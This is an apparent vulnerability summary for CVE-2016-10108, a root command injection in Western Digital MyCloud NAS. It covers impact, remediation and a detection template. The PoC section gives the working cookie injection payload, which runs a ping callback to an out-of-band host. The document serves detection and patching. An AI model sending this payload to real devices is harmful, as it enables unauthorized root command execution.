## Vulnerability
Western Digital MyCloud NAS 2.11.142 is affected by an unauthenticated remote command injection (CWE-77, CVE-2016-10108) that permits arbitrary OS commands to execute as root through crafted web requests to the device interface. Successful exploitation yields full system compromise including root shell, data exfiltration, modification, or destruction. CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Impact includes unauthorized access, data loss, and full network compromise if the NAS is internet-exposed. Remediation requires applying the latest Western Digital firmware and blocking external access to the management interface.

## PoC / Detection
Classification: rce  
The template issues a single GET request to `/` supplying a `Cookie` header with an injection payload inside the `username` field (`admin|echo \`ping -c 3 {{interactsh-url}}\``) together with `isAdmin=1` and `local_login=1`. It confirms exploitation when the response body contains the string `WDMyCloud`, a DNS interaction is received on the OOB interactsh server, and the HTTP status code is 200.
